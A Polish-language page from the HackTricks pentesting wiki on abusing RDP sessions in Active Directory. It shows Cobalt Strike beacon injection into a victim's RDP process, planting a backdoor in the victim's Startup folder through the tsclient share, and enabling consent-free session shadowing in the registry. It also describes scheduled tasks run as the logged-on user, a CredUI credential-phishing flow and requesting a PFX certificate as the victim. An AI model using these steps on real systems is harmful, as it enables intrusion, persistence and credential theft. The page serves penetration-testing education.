# Nadużywanie sesji RDP

{{#include ../../banners/hacktricks-training.md}}

## RDP Process Injection

Jeśli **grupa zewnętrzna** ma **dostęp przez RDP** do **komputera** w bieżącej domenie, atakujący, który przejmie kontrolę nad tym komputerem, może poczekać, aż członek grupy się z nim połączy.

Gdy użytkownik połączy się przez RDP, **atakujący może przejść do sesji tego użytkownika** i nadużyć jego uprawnień w domenie zewnętrznej.

```bash
# Supposing the group "External Users" has RDP access in the current domain
## Find which computers they can access
## The easiest way would be with bloodhound, but you could also run:
Get-DomainGPOUserLocalGroupMapping -Identity "External Users" -LocalGroup "Remote Desktop Users" | select -expand ComputerName
#or
Find-DomainLocalGroupMember -GroupName "Remote Desktop Users" | select -expand ComputerName

# Then, compromise the listed machines, and wait til someone from the external domain logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
 PID   PPID  Name                         Arch  Session     User
 ---   ----  ----                         ----  -------     -----
 ...
 4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local
## From that beacon you can just run powerview modules interacting with the external domain as that user
```

Sprawdź **inne sposoby kradzieży sesji przy użyciu innych narzędzi** [**na tej stronie.**](../../network-services-pentesting/pentesting-rdp.md#session-stealing)

## Przekaźnik uwierzytelniania między sesjami

**Aktywna sesja konsoli lub RDP** należąca do innego użytkownika domeny może być przydatna, gdy masz powłokę z niższymi uprawnieniami na tym samym hoście. Aktywacja DCOM między sesjami może spowodować, że odpowiedni serwer COM w tej interaktywnej sesji przeprowadzi uwierzytelnianie, które narzędzia takie jak RemotePotato0 lub KrbRelay mogą przechwycić lub przekazać dalej. Zalogowany użytkownik nie musi być administratorem domeny: do dalszego pivotu może wystarczyć wąsko określone uprawnienie katalogowe, na przykład prawo odczytu hasła zarządzanego gMSA.<sup>[[6]](#references)[[7]](#references)[[9]](#references)</sup>

Zacznij od ustalenia identyfikatora sesji i tożsamości za pomocą `query user`, `qwinsta` lub istniejącego wykazu sesji winPEAS. Traktuj je jako **potencjalne cele**, a nie dowód, że istnieje ścieżka przekazywania uwierzytelnienia. Znaczenie mają klasa COM, jej poziomy personifikacji i uwierzytelniania, dostępność sesji, routing zapory/OXID, zabezpieczenia protokołu docelowego oraz efektywne uprawnienia zalogowanej tożsamości. KrbRelay opisuje przykłady przekazywania uwierzytelnienia między sesjami przez LDAP, HTTP, SMB i NTLM, ale ścieżki te zależą od wersji i konfiguracji. LDAP channel binding to kolejna bariera po stronie celu, utrudniająca przekazywanie uwierzytelnienia. W szczególności w projekcie RemotePotato0 zaznaczono, że pierwotny scenariusz exploita RPC-to-LDAP został załatany w 2022 roku; sama widoczna sesja nie oznacza, że przekazywanie uwierzytelnienia przez LDAP się powiedzie.<sup>[[6]](#references)[[7]](#references)[[8]](#references)[[10]](#references)</sup>

## RDPInception

Jeśli użytkownik połączy się przez **RDP z maszyną**, na której **czeka** **atakujący**, atakujący będzie mógł **wstrzyknąć beacon do sesji RDP użytkownika**. Jeśli **ofiara podmontowała swój dysk** podczas łączenia przez RDP, **atakujący może uzyskać do niego dostęp**.

W takim przypadku możesz po prostu **zhakować** **oryginalny komputer ofiary**, umieszczając **backdoor** w **folderze startowym**.

```bash
# Wait til someone logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
 PID   PPID  Name                         Arch  Session     User
 ---   ----  ----                         ----  -------     -----
 ...
 4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local

# There's a UNC path called tsclient which has a mount point for every drive that is being shared over RDP.
## \\tsclient\c is the C: drive on the origin machine of the RDP session
beacon> ls \\tsclient\c

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     02/10/2021 04:11:30   $Recycle.Bin
          dir     02/10/2021 03:23:44   Boot
          dir     02/20/2021 10:15:23   Config.Msi
          dir     10/18/2016 01:59:39   Documents and Settings
          [...]

# Upload backdoor to startup folder
beacon> cd \\tsclient\c\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
beacon> upload C:\Payloads\pivot.exe
```

## Shadow RDP

Jeśli masz uprawnienia **local admin** na hoście, na którym ofiara ma już **aktywną sesję RDP**, możesz mieć możliwość **wyświetlania/kontrolowania tego pulpitu bez kradzieży hasła ani zrzucania LSASS**.<sup>[[1]](#references)</sup>

Zależy to od zasad **shadowing Remote Desktop Services**, zapisanych w:<sup>[[2]](#references)</sup><sup>[[3]](#references)</sup>

```text
HKLM\Software\Policies\Microsoft\Windows NT\Terminal Services\Shadow
```

Ciekawe wartości:

- `0`: Wyłączone
- `1`: `EnableInputNotify` (sterowanie, wymagana zgoda użytkownika)
- `2`: `EnableInputNoNotify` (sterowanie, **bez zgody użytkownika**)
- `3`: `EnableNoInputNotify` (tylko podgląd, wymagana zgoda użytkownika)
- `4`: `EnableNoInputNoNotify` (tylko podgląd, **bez zgody użytkownika**)

```cmd
:: Check the policy
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow

:: Enable interaction without consent
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /t REG_DWORD /d 2 /f

:: Enumerate sessions and shadow the target one
quser /server:<HOST>
mstsc /v:<HOST> /shadow:<SESSION_ID> /control /noconsentprompt /prompt
```

Jest to szczególnie przydatne, gdy uprzywilejowany użytkownik połączony przez RDP pozostawił odblokowany pulpit, sesję KeePass, konsolę MMC, sesję przeglądarki lub powłokę administratora.

## Zaplanowane zadania jako zalogowany użytkownik

Jeśli jesteś **lokalnym administratorem**, a użytkownik docelowy jest **aktualnie zalogowany**, Harmonogram zadań może uruchomić kod **jako ten użytkownik, bez jego hasła**.<sup>[[1]](#references)</sup><sup>[[4]](#references)</sup>

Dzięki temu istniejąca sesja logowania ofiary staje się mechanizmem uruchamiania kodu:

```cmd
schtasks /create /S <HOST> /RU "<DOMAIN\\user>" /SC ONCE /ST 00:00 /TN "Updater" /TR "cmd.exe /c whoami > C:\\Windows\\Temp\\whoami.txt"
schtasks /run /S <HOST> /TN "Updater"
```

Uwagi:

- Jeśli użytkownik **nie jest zalogowany**, Windows zwykle wymaga hasła, aby utworzyć zadanie uruchamiane jako ten użytkownik.
- Jeśli użytkownik **jest zalogowany**, zadanie może ponownie użyć istniejącego kontekstu logowania.
- To praktyczny sposób na wykonywanie działań w GUI lub uruchamianie plików binarnych w sesji ofiary bez dotykania LSASS.

## Nadużycie monitu CredUI z sesji ofiary

Gdy możesz wykonywać polecenia **wewnątrz interaktywnego pulpitu ofiary** (na przykład przez **Shadow RDP** lub **zadanie zaplanowane uruchamiane jako ten użytkownik**), możesz wyświetlić **prawdziwy monit poświadczeń Windows** za pomocą interfejsów API CredUI i przechwycić poświadczenia wpisane przez ofiarę.<sup>[[1]](#references)</sup>

Istotne interfejsy API:

- `CredUIPromptForWindowsCredentials`
- `CredUnPackAuthenticationBuffer`

Typowy przebieg:

1. Uruchom plik binarny w sesji ofiary.
2. Wyświetl monit uwierzytelniania domenowego zgodny z identyfikacją wizualną bieżącej domeny.
3. Rozpakuj zwrócony bufor uwierzytelniania.
4. Zweryfikuj podane poświadczenia i opcjonalnie ponawiaj monit, aż zostaną wprowadzone prawidłowe poświadczenia.

Jest to przydatne w przypadku **phishingu na hoście**, ponieważ monit jest wyświetlany przez standardowe interfejsy API Windows, a nie przez fałszywy formularz HTML.

## Żądanie PFX w kontekście ofiary

Tę samą podstawową metodę **zadania zaplanowanego uruchamianego jako użytkownik** można wykorzystać do zażądania **certyfikatu/PFX jako zalogowana ofiara**. Taki certyfikat można później wykorzystać do **uwierzytelniania w AD** jako ten użytkownik, całkowicie unikając kradzieży hasła.<sup>[[1]](#references)</sup><sup>[[5]](#references)</sup>

Ogólny przebieg:

1. Uzyskaj **lokalne uprawnienia administratora** na hoście, na którym ofiara jest zalogowana.
2. Uruchom logikę rejestracji/eksportu jako ofiara, używając **zadania zaplanowanego**.
3. Wyeksportuj wynikowy **PFX**.
4. Użyj PFX do uwierzytelniania w AD przez PKINIT / certyfikat.

Dalsze informacje o nadużyciach znajdziesz na stronach AD CS:

{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

## References

- [1] [SensePost - Od płaskich sieci do zablokowanych domen dzięki modelom warstwowym](https://sensepost.com/blog/2026/from-flat-networks-to-locked-up-domains-with-tiering-models/)
- [2] [Microsoft Learn – opcje sesji shadow `mstsc`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/mstsc)
- [3] [NetExec - PR w sprawie wtyczki Shadow RDP nr 465](https://github.com/Pennyw0rth/NetExec/pull/465)
- [4] [NetExec - moduł schtask_as](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/schtask_as.py)
- [5] [NetExec - PR w sprawie żądania PFX za pomocą zadania zaplanowanego nr 908](https://github.com/Pennyw0rth/NetExec/pull/908)
- [6] [RemotePotato0 - aktywacja DCOM między sesjami i obecne ograniczenia](https://github.com/antonioCoco/RemotePotato0)
- [7] [KrbRelay - przykłady relay między sesjami i wymagania dotyczące CLSID](https://github.com/cube0x0/KrbRelay)
- [8] [Microsoft - polecenie query session](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/query-session)
- [9] [Microsoft - atrybut ms-DS-GroupMSAMembership](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-groupmsamembership)
- [10] [Microsoft - LDAP channel binding i ochrona przed relay](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding)
{{#include ../../banners/hacktricks-training.md}}
